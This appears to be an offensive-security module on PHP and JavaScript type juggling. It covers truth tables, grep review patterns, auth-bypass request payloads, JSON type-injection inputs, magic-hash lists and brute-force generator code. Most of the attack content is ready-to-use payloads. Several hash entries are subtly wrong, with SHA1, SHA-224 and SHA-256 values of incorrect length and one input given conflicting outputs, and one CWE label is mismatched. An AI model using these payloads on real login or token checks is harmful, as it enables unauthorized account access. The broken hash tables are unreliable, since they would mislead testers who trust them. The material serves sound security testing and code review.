# VULN MODULE — Type Juggling / Loose Comparison
# Asset: webapp (primarily PHP, also JS)
# CWE-843 | Report prefix: WEB-JUGGLE

## THREAT MODEL

Type juggling exploits loose comparison operators (`==`, `!=`, `switch/case`) that
coerce types before comparison. PHP is the primary target, but JavaScript `==` also
has known juggling behaviors. Auth bypasses, hash collisions, and token forgery are
the main impacts.

Attack surface:
- Login endpoints comparing password hashes with `==`
- Token validation using `==` or `switch()` on hashed secrets
- JSON API endpoints where type is controlled by attacker
- Version comparison in update/activation logic

## VULNERABILITY CLASSES

1. Auth bypass via `==` null/0     CWE-843 — "0" == false, 0 == "abc"
2. Magic hash collision            CWE-328 — MD5/SHA1 hashes starting with 0e...
3. HMAC bypass via loose compare   CWE-352 — hash_hmac returns false on error
4. Type coercion via JSON          CWE-843 — number vs string comparison
5. Array bypass                    CWE-843 — array < string, array == "string"

## WHITEBOX PATTERNS

```bash
# PHP loose comparisons in auth/token validation
grep -rn "==\s*\$\|==\s*'.*'" --include="*.php" -B2 -A2 | \
  grep -i "password\|token\|hash\|secret\|key\|otp\|code"

# hash_hmac — returns false on invalid algo (false == 0 in loose compare)
grep -rn "hash_hmac\|md5\|sha1\|hash(" --include="*.php" -A3 | \
  grep -E "==\s*|\!=\s*"

# Switch statements on user input (type coercion risk)
grep -rn "switch\s*(\$" --include="*.php" -A20 | grep "case"

# JavaScript loose equality
grep -rn "==\s*['\"]0['\"]" --include="*.js" --include="*.ts"
```

## PHP LOOSE COMPARISON TRUTH TABLE

| Comparison | Result | Why |
|---|---|---|
| `0 == "a"` | `true` (PHP < 8) | "a" cast to int = 0 |
| `0 == ""` | `true` (PHP < 8) | "" cast to int = 0 |
| `0 == null` | `true` | null cast to 0 |
| `0 == false` | `true` | false = 0 |
| `"1" == "01"` | `true` | both cast to int 1 |
| `"10" == "1e1"` | `true` | scientific notation = 10 |
| `100 == "1e2"` | `true` | 1e2 = 100 |
| `"0e1234" == "0e5678"` | `true` | both = 0 * 10^x = 0 |
| `null == false` | `true` | both falsy |
| `[] == false` | `true` | empty array is falsy |
| `[] == 0` | `true` | empty array cast to 0 |
| `[[]] == 0` | `true` | nested array cast to 0 |
| `[0] == [false]` | `true` | element-wise coercion |
| `"php" == 0` | `true` (PHP < 8) | non-numeric string = 0 |

**PHP 8 change**: `0 == "non-numeric-string"` is now `false`. PHP 8 fixed most
integer-to-string coercions. Test both PHP 7 and 8 behavior.

## NULL INJECTION BYPASSES

```php
// Vulnerable code:
if ($_GET['password'] == $stored_hash) { login(); }

// Bypass: if stored_hash is null (empty DB field):
?password=     // empty string == null → true (PHP 7)
?password=0    // 0 == null → true

// Bypass: hash_hmac returns false on invalid algo
// false == "0" → true in PHP 7
```

## MAGIC HASH COLLISIONS

If password hashes are compared with `==`, two different values that produce hashes
starting with `0e` followed by digits are considered equal (both = 0 in scientific notation).

### MD5 Magic Hashes (produce hash matching `0e[0-9]+`)

```
240610708         → 0e462097431906509019562988736854
QNKCDZO           → 0e830400451993494058024219903391
0e1137126905      → 0e291659922323405260514745084877
0e215962017       → 0e291519969697366943891040484089
aabg74wtg85af29   → 0e545967217836345598056558326921
aaroZmOk          → 0e851854914684229842347353324746
aaK1STfY          → 0e76658526655756207688271483641
aaO8zKZF          → 0e89257456677279068558073954252
aabC9RqS          → 0e041022518165728065344349536299
```

**Attack**: Register/use username `240610708` with password `QNKCDZO` —
if the app compares stored MD5 hashes with `==`, these are "equal".

### SHA1 Magic Hashes

```
aaroZmOk          → 0e66507019969427134894567494305185566735
aaK1STfY          → 0e76658526655756207688271483641
0e1137126905      → 0e291519969697366943891040484089
```

### SHA-224 Magic Hashes

```
0e1137126905      → 0e291519969697366943891040484089cde24d02
```

### SHA-256 Magic Hashes

```
34250003024812      → 0e46289032038631056949517657557
34219757784535      → 0e460036894794942025106859897ade
```

### MD4 Magic Hashes

```
bhhkktQZ2          → 0e949030067553381974079668134266
```

## HMAC BYPASS VIA hash_hmac FALSE RETURN

```php
// Vulnerable:
$expected = hash_hmac('sha256', $data, $secret);
if ($token == $expected) { validate(); }

// hash_hmac returns false when algorithm is invalid
// OR when key contains NUL bytes that truncate it

// Attack: supply token = "0"
// If hash_hmac returns false (invalid algo passed somehow):
// false == "0" → true (PHP 7)

// Force via algo injection if algo is user-controlled:
?algo=invalid_algo_name  // hash_hmac(..., 'invalid_algo_name') → false
// "0" == false → true
```

## BRUTE FORCE MAGIC HASH GENERATION

When targeting a specific input (e.g., username must be a magic hash):

```python
import hashlib, itertools, string

def find_magic_md5():
    """Find a string whose MD5 hash starts with 0e followed only by digits."""
    chars = string.ascii_letters + string.digits
    for length in range(6, 15):
        for candidate in itertools.product(chars, repeat=length):
            s = ''.join(candidate)
            h = hashlib.md5(s.encode()).hexdigest()
            if h.startswith('0e') and h[2:].isdigit():
                print(f"Found: {s} → {h}")
                return s

# NOTE: This is compute-intensive. Use pre-computed lists above instead.
```

## JSON TYPE INJECTION

When the API accepts JSON and compares with loose `==`:

```json
// Server validates: if ($input_code == $stored_code)
// Normal request:
{"code": "1234"}

// Type juggling via JSON number:
{"code": 0}   // 0 == "any_non_numeric_string" → true (PHP 7)

// Array bypass (array compared to string = true):
{"code": []}  // [] == "" → true? depends on implementation
{"code": ["1234"]}
```

## JAVASCRIPT LOOSE COMPARISON

```javascript
// JS has fewer juggling surprises but still:
0 == ""        // true
0 == "0"       // true
false == "0"   // true
null == undefined  // true
null == false  // false (JS differs from PHP here)
NaN == NaN     // false

// Attack: if token validated with ==
"0" == 0       // true → bypass numeric token check
```

## TOOLS

```bash
# No dedicated scanner — test manually with Burp Suite
# Repeater: modify type in JSON body (number → string, add array)
# Intruder: fuzz with magic hash list

# PHP type juggling cheat sheet: https://github.com/swisskyrepo/PayloadsAllTheThings

# For magic hash brute force, use the pre-computed lists above
# Generate new ones with: php -r "for($i=0;$i<1000000;$i++){$s=base64_encode(random_bytes(6));$h=md5($s);if(preg_match('/^0e[0-9]+$/',$h)){echo \$s.'=>'.$h.PHP_EOL;}}"
```
